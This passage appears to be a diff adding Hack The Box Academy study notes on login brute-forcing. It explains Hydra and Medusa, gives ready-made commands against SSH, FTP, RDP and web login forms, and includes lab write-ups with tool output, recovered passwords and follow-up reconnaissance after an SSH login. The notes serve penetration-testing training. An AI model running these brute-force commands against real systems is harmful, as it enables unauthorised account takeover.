@@ -425,3 +425,1111 @@ A successful match grants unauthorized access, opening the door to various malic
 
 The core issue fueling credential stuffing's success is the pervasive practice of password reuse. When users rely on the same or similar passwords for multiple accounts, a breach on one platform can have a domino effect, compromising numerous other accounts. This highlights the urgent need for strong, unique passwords for every online service, coupled with proactive security measures like multi-factor authentication.
 
+# Hydra
+
+Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.
+
+Hydra's popularity stems from its:
+
+- `Speed and Efficiency`: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.
+- `Flexibility`: Hydra supports many protocols and services, making it adaptable to various attack scenarios.
+- `Ease of Use`: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.
+
+### Installation
+
+Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:
+
+```shell
+gitblanc@htb[/htb]$ hydra -h
+```
+
+If Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:
+
+```shell
+gitblanc@htb[/htb]$ sudo apt-get -y update
+gitblanc@htb[/htb]$ sudo apt-get -y install hydra 
+```
+
+## Basic Usage
+
+Hydra's basic syntax is:
+
+```shell
+gitblanc@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
+```
+
+|Parameter|Explanation|Usage Example|
+|---|---|---|
+|`-l LOGIN` or `-L FILE`|Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).|`hydra -l admin ...` or `hydra -L usernames.txt ...`|
+|`-p PASS` or `-P FILE`|Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`).|`hydra -p password123 ...` or `hydra -P passwords.txt ...`|
+|`-t TASKS`|Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.|`hydra -t 4 ...`|
+|`-f`|Fast mode: Stop the attack after the first successful login is found.|`hydra -f ...`|
+|`-s PORT`|Port: Specify a non-default port for the target service.|`hydra -s 2222 ...`|
+|`-v` or `-V`|Verbose output: Display detailed information about the attack's progress, including attempts and results.|`hydra -v ...` or `hydra -V ...` (for even more verbosity)|
+|`service://server`|Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.|`hydra ssh://192.168.1.100`|
+|`/OPT`|Service-specific options: Provide any additional options required by the target service.|`hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication)|
+
+### Hydra Services
+
+Hydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:
+
+|Hydra Service|Service/Protocol|Description|Example Command|
+|---|---|---|---|
+|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
+|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
+|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
+|smtp|Simple Mail Transfer Protocol|Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.|`hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`|
+|pop3|Post Office Protocol (POP3)|Targets email retrieval services to brute-force credentials for POP3 login.|`hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`|
+|imap|Internet Message Access Protocol|Used to brute-force credentials for IMAP services, which allow users to access their email remotely.|`hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`|
+|mysql|MySQL Database|Attempts to brute-force login credentials for MySQL databases.|`hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`|
+|mssql|Microsoft SQL Server|Targets Microsoft SQL servers to brute-force database login credentials.|`hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`|
+|vnc|Virtual Network Computing (VNC)|Brute-forces VNC services, used for remote desktop access.|`hydra -P /path/to/password_list.txt vnc://192.168.1.100`|
+|rdp|Remote Desktop Protocol (RDP)|Targets Microsoft RDP services for remote login brute-forcing.|`hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`|
+
+### Brute-Forcing HTTP Authentication
+
+Imagine you're tasked with testing the security of a website using basic HTTP authentication at `www.example.com`. You have a list of potential usernames stored in `usernames.txt` and corresponding passwords in `passwords.txt`. To launch a brute-force attack against this HTTP service, use the following Hydra command:
+
+```shell
+gitblanc@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
+```
+
+This command instructs Hydra to:
+
+- Use the list of usernames from the `usernames.txt` file.
+- Use the list of passwords from the `passwords.txt` file.
+- Target the website `www.example.com`.
+- Employ the `http-get` module to test the HTTP authentication.
+
+Hydra will systematically try each username-password combination against the target website to discover a valid login.
+
+### Targeting Multiple SSH Servers
+
+Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named `targets.txt` and know that these servers might use the default username "root" and password "toor." To efficiently test all these servers simultaneously, use the following Hydra command:
+
+```shell
+gitblanc@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
+```
+
+This command instructs Hydra to:
+
+- Use the username "root".
+- Use the password "toor".
+- Target all IP addresses listed in the `targets.txt` file.
+- Employ the `ssh` module for the attack.
+
+Hydra will execute parallel brute-force attempts on each server, significantly speeding up the process.
+
+### Testing FTP Credentials on a Non-Standard Port
+
+Imagine you need to assess the security of an FTP server hosted at `ftp.example.com`, which operates on a non-standard port `2121`. You have lists of potential usernames and passwords stored in `usernames.txt` and `passwords.txt`, respectively. To test these credentials against the FTP service, use the following Hydra command:
+
+```shell
+gitblanc@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
+```
+
+This command instructs Hydra to:
+
+- Use the list of usernames from the `usernames.txt` file.
+- Use the list of passwords from the `passwords.txt` file.
+- Target the FTP service on `ftp.example.com` via port `2121`.
+- Use the `ftp` module and provide verbose output (`-V`) for detailed monitoring.
+
+Hydra will attempt to match each username-password combination against the FTP server on the specified port.
+
+### Brute-Forcing a Web Login Form
+
+Suppose you are tasked with brute-forcing a login form on a web application at `www.example.com`. You know the username is "admin," and the form parameters for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:
+
+```shell
+gitblanc@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+```
+
+This command instructs Hydra to:
+
+- Use the username "admin".
+- Use the list of passwords from the `passwords.txt` file.
+- Target the login form at `/login` on `www.example.com`.
+- Employ the `http-post-form` module with the specified form parameters.
+- Look for a successful login indicated by the HTTP status code `302`.
+
+Hydra will systematically attempt each password for the "admin" account, checking for the specified success condition.
+
+### Advanced RDP Brute-Forcing
+
+Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:
+
+```shell
+gitblanc@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
+```
+
+This command instructs Hydra to:
+
+- Use the username "administrator".
+- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
+- Target the RDP service on `192.168.1.100`.
+- Employ the `rdp` module for the attack.
+
+Hydra will generate and test all possible password combinations within the specified parameters, attempting to break into the RDP service.
+
+# Basic HTTP Authentication
+
+Web applications often employ authentication mechanisms to protect sensitive data and functionalities. Basic HTTP Authentication, or simply `Basic Auth`, is a rudimentary yet common method for securing resources on the web. Though easy to implement, its inherent security vulnerabilities make it a frequent target for brute-force attacks.
+
+In essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the user's browser to present a login dialog.
+
+Once the user provides their username and password, the browser concatenates them into a single string, separated by a colon. This string is then encoded using Base64 and included in the `Authorization` header of subsequent requests, following the format `Basic <encoded_credentials>`. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.
+
+For example, the headers for Basic Auth in a HTTP GET request would look like:
+
+```http
+GET /protected_resource HTTP/1.1
+Host: www.example.com
+Authorization: Basic YWxpY2U6c2VjcmV0MTIz
+```
+
+## Exploiting Basic Auth with Hydra
+
+We will use the `http-get` hydra service to brute force the basic authentication target.
+
+In this scenario, the spawned target instance employs Basic HTTP Authentication. We already know the username is `basic-auth-user`. Since we know the username, we can simplify the Hydra command and focus solely on brute-forcing the password. Here's the command we'll use:
+
+```shell
+# Download wordlist if needed
+gitblanc@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+# Hydra command
+gitblanc@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
+
+...
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
+[DATA] attacking http-get://127.0.0.1:81/
+[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
+```
+
+Let's break down the command:
+
+- `-l basic-auth-user`: This specifies that the username for the login attempt is 'basic-auth-user'.
+- `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.
+- `127.0.0.1`: This is the target IP address, in this case, the local machine (localhost).
+- `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').
+- `-s 81`: This overrides the default port for the HTTP service and sets it to 81.
+
+Upon execution, Hydra will systematically attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource. Eventually it will return the correct password for `basic-auth-user`, which you can use to login to the website and retrieve the flag.
+
+>[!Example]
+>The academy exercise for this section
+
+I'll use the following command:
+
+```shell
+hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.54.116 http-get / -s 57413
+
+[redacted]
+[57413][http-get] host: 94.237.54.116   login: basic-auth-user   password: Password@123 
+```
+
+# Login Forms
+
+Beyond the realm of Basic HTTP Authentication, many web applications employ custom login forms as their primary authentication mechanism. These forms, while visually diverse, often share common underlying mechanics that make them targets for brute forcing.
+
+## Understanding Login Forms
+
+While login forms may appear as simple boxes soliciting your username and password, they represent a complex interplay of client-side and server-side technologies. At their core, login forms are essentially HTML forms embedded within a webpage. These forms typically include input fields (`<input>`) for capturing the username and password, along with a submit button (`<button>` or `<input type="submit">`) to initiate the authentication process.
+
+## A Basic Login Form Example
+
+Most login forms follow a similar structure. Here's an example:
+
+```html
+<form action="/login" method="post">
+  <label for="username">Username:</label>
+  <input type="text" id="username" name="username"><br><br>
+  <label for="password">Password:</label>
+  <input type="password" id="password" name="password"><br><br>
+  <input type="submit" value="Submit">
+</form>
+```
+
+This form, when submitted, sends a POST request to the `/login` endpoint on the server, including the entered username and password as form data.
+
+```http
+POST /login HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=john&password=secret123
+```
+
+- The `POST` method indicates that data is being sent to the server to create or update a resource.
+- `/login` is the URL endpoint handling the login request.
+- The `Content-Type` header specifies how the data is encoded in the request body.
+- The `Content-Length` header indicates the size of the data being sent.
+- The request body contains the username and password, encoded as key-value pairs.
+
+When a user interacts with a login form, their browser handles the initial processing. The browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization. Upon submission, the browser constructs an HTTP POST request. This request encapsulates the form data—including the username and password—within its body, often encoded as `application/x-www-form-urlencoded` or `multipart/form-data`.
+
+## http-post-form
+
+Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body. By leveraging Hydra's capabilities, attackers can efficiently test numerous credential combinations against a login form, potentially uncovering valid logins.
+
+The general structure of a Hydra command using `http-post-form` looks like this:
+
+```shell
+gitblanc@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
+```
+
+### Understanding the Condition String
+
+In Hydra’s `http-post-form` module, success and failure conditions are crucial for properly identifying valid and invalid login attempts. Hydra primarily relies on failure conditions (`F=...`) to determine when a login attempt has failed, but you can also specify a success condition (`S=...`) to indicate when a login is successful.
+
+The failure condition (`F=...`) is used to check for a specific string in the server's response that signals a failed login attempt. This is the most common approach because many websites return an error message (like "Invalid username or password") when the login fails. For example, if a login form returns the message "Invalid credentials" on a failed attempt, you can configure Hydra like this:
+
+```bash
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+```
+
+In this case, Hydra will check each response for the string "Invalid credentials." If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair. This approach is commonly used because failure messages are usually easy to identify.
+
+However, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using HTTP status code `302`), or displays specific content (like "Dashboard" or "Welcome"), you can configure Hydra to look for that success condition using `S=`. Here’s an example where a successful login results in a 302 redirect:
+
+```bash
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+```
+
+In this case, Hydra will treat any response that returns an HTTP 302 status code as a successful login. Similarly, if a successful login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:
+
+```bash
+hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
+```
+
+Hydra will now register the login as successful if it finds the word "Dashboard" in the server’s response.
+
+Before unleashing Hydra on a login form, it's essential to gather intelligence on its inner workings. This involves pinpointing the exact parameters the form uses to transmit the username and password to the server.
+
+### Manual Inspection
+
+Upon accessing the `IP:PORT` in your browser, a basic login form is presented. Using your browser's developer tools (typically by right-clicking and selecting "Inspect" or a similar option), you can view the underlying HTML code for this form. Let's break down its key components:
+
+```html
+<form method="POST">
+    <h2>Login</h2>
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username">
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password">
+    <input type="submit" value="Login">
+</form>
+```
+
+The HTML reveals a simple login form. Key points for Hydra:
+
+- `Method`: `POST` - Hydra will need to send POST requests to the server.
+- Fields:
+    - `Username`: The input field named `username` will be targeted.
+    - `Password`: The input field named `password` will be targeted.
+
+With these details, you can construct the Hydra command to automate the brute-force attack against this login form.
+
+### Browser Developer Tools
+
+After inspecting the form, open your browser's Developer Tools (F12) and navigate to the "Network" tab. Submit a sample login attempt with any credentials. This will allow you to see the POST request sent to the server. In the "Network" tab, find the request corresponding to the form submission and check the form data, headers, and the server’s response.
+
+![](Pasted%20image%2020250303233025.png)
+
+This information further solidifies the information we will need for Hydra. We now have definitive confirmation of both the target path (`/`) and the parameter names (`username` and `password`).
+
+### Proxy Interception
+
+For more complex scenarios, intercepting the network traffic with a proxy tool like Burp Suite or OWASP ZAP can be invaluable. Configure your browser to route its traffic through the proxy, then interact with the login form. The proxy will capture the POST request, allowing you to dissect its every component, including the precise login parameters and their values.
+
+## Constructing the params String for Hydra
+
+After analyzing the login form's structure and behavior, it's time to build the `params` string, a critical component of Hydra's `http-post-form` attack module. This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.
+
+The `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.
+
+- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
+- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.
+- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).
+
+Let's apply this to our scenario. We've discovered:
+
+- The form submits data to the root path (`/`).
+- The username field is named `username`.
+- The password field is named `password`.
+- An error message "Invalid credentials" is displayed upon failed login.
+
+Therefore, our `params` string would be:
+
+```bash
+/:username=^USER^&password=^PASS^:F=Invalid credentials
+```
+
+- `"/"`: The path where the form is submitted.
+- `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
+- `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
+
+We will be using [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) for the username list, and [2023-200_most_used_passwords.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) for the password list.
+
+This `params` string is incorporated into the Hydra command as follows. Hydra will systematically substitute `^USER^` and `^PASS^` with values from your wordlists, sending POST requests to the target and analyzing the responses for the specified failure condition. If a login attempt doesn't trigger the "Invalid credentials" message, Hydra will flag it as a potential success, revealing the valid credentials.
+
+```shell
+# Download wordlists if needed
+gitblanc@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+gitblanc@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+# Hydra command
+gitblanc@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 12:51:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
+[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
+[5000][http-post-form] host: IP   login: ...   password: ...
+[STATUS] attack finished for IP (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28
+```
+
+Remember that crafting the correct `params` string is crucial for a successful Hydra attack. Accurate information about the form's structure and behavior is essential for constructing this string effectively. Once Hydra has completed the attack, log into the website using the found credentials, and retrieve the flag.
+
+> [!Example]
+> The academy exercise for this section
+
+I first inspected the petition with the devtools of my browser:
+
+![](Pasted%20image%2020250303234010.png)
+
+Seems to be a post to `/` with the params `username` and `password`. Also the error message is `Invalid credentials`. So I crafted the attack for hydra:
+
+```shell
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.55.128 -s 48916 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+[redacted]
+[48916][http-post-form] host: 94.237.55.128   login: admin   password: zxcvbnm
+```
+
+![](Pasted%20image%2020250303234337.png)
+
+# Medusa
+
+Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.
+
+## Installation
+
+Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:
+
+```shell
+gitblanc@htb[/htb]$ medusa -h
+```
+
+Installing Medusa on a Linux system is straightforward.
+
+```shell
+gitblanc@htb[/htb]$ sudo apt-get -y update
+gitblanc@htb[/htb]$ sudo apt-get -y install medusa
+```
+
+## Command Syntax and Parameter Table
+
+Medusa's command-line interface is straightforward. It allows users to specify hosts, users, passwords, and modules with various options to fine-tune the attack process.
+
+```shell
+gitblanc@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
+```
+
+|Parameter|Explanation|Usage Example|
+|---|---|---|
+|`-h HOST` or `-H FILE`|Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).|`medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`|
+|`-u USERNAME` or `-U FILE`|Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).|`medusa -u admin ...` or `medusa -U usernames.txt ...`|
+|`-p PASSWORD` or `-P FILE`|Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).|`medusa -p password123 ...` or `medusa -P passwords.txt ...`|
+|`-M MODULE`|Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|
+|`-m "MODULE_OPTION"`|Module options: Provide additional parameters required by the chosen module, enclosed in quotes.|`medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...`|
+|`-t TASKS`|Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.|`medusa -t 4 ...`|
+|`-f` or `-F`|Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).|`medusa -f ...` or `medusa -F ...`|
+|`-n PORT`|Port: Specify a non-default port for the target service.|`medusa -n 2222 ...`|
+|`-v LEVEL`|Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output.|`medusa -v 4 ...`|
+
+### Medusa Modules
+
+Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:
+
+|Medusa Module|Service/Protocol|Description|Usage Example|
+|---|---|---|---|
+|FTP|File Transfer Protocol|Brute-forcing FTP login credentials, used for file transfers over a network.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
+|HTTP|Hypertext Transfer Protocol|Brute-forcing login forms on web applications over HTTP (GET/POST).|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
+|IMAP|Internet Message Access Protocol|Brute-forcing IMAP logins, often used to access email servers.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
+|MySQL|MySQL Database|Brute-forcing MySQL database credentials, commonly used for web applications and databases.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
+|POP3|Post Office Protocol 3|Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
+|RDP|Remote Desktop Protocol|Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
+|SSHv2|Secure Shell (SSH)|Brute-forcing SSH logins, commonly used for secure remote access.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
+|Subversion (SVN)|Version Control System|Brute-forcing Subversion (SVN) repositories for version control.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
+|Telnet|Telnet Protocol|Brute-forcing Telnet services for remote command execution on older systems.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
+|VNC|Virtual Network Computing|Brute-forcing VNC login credentials for remote desktop access.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
+|Web Form|Brute-forcing Web Login Forms|Brute-forcing login forms on websites using HTTP POST requests.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|
+
+### Targeting an SSH Server
+
+Imagine a scenario where you need to test the security of an SSH server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attack against the SSH service on this server, use the following Medusa command:
+
+```shell
+gitblanc@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
+```
+
+This command instructs Medusa to:
+
+- Target the host at `192.168.0.100`.
+- Use the usernames from the `usernames.txt` file.
+- Test the passwords listed in the `passwords.txt` file.
+- Employ the `ssh` module for the attack.
+
+Medusa will systematically try each username-password combination against the SSH service to attempt to gain unauthorized access.
+
+### Targeting Multiple Web Servers with Basic HTTP Authentication
+
+Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in `web_servers.txt`, and you also have lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:
+
+```shell
+gitblanc@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
+```
+
+In this case, Medusa will:
+
+- Iterate through the list of web servers in `web_servers.txt`.
+- Use the usernames and passwords provided.
+- Employ the `http` module with the `GET` method to attempt logins.
+
+By running multiple threads, Medusa efficiently checks each server for weak credentials.
+
+### Testing for Empty or Default Passwords
+
+If you want to assess whether any accounts on a specific host (`10.0.0.5`) have empty or default passwords (where the password matches the username), you can use:
+
+```shell
+gitblanc@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
+```
+
+This command instructs Medusa to:
+
+- Target the host at `10.0.0.5`.
+- Use the usernames from `usernames.txt`.
+- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
+- Use the appropriate service module (replace `service_name` with the correct module name).
+
+Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.
+
+# Web Services
+
+In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of `Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
+
+`SSH` is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like `Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
+
+`FTP` is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.
+
+## Kick-off
+
+We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.
+
+The following command serves as our starting point:
+
+```shell
+gitblanc@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+```
+
+Let's break down each component:
+
+- `-h <IP>`: Specifies the target system's IP address.
+- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
+- `-u sshuser`: Sets the username for the brute-force attack.
+- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
+- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
+- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
+
+```shell
+gitblanc@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+...
+ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
+```
+
+Upon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.
+
+## Gaining Access
+
+With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:
+
+```shell
+gitblanc@htb[/htb]$ ssh sshuser@<IP> -p PORT
+```
+
+This command will initiate an interactive SSH session, granting you access to the remote system's command line.
+
+### Expanding the Attack Surface
+
+Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
+
+```shell
+gitblanc@htb[/htb]$ netstat -tulpn | grep LISTEN
+
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+```
+
+Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.
+
+```shell
+gitblanc@htb[/htb]$ nmap localhost
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000078s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
+```
+
+### Targeting the FTP Server
+
+Having identified the FTP server, you can proceed to brute-force its authentication mechanism.
+
+If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
+
+```shell
+gitblanc@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 5
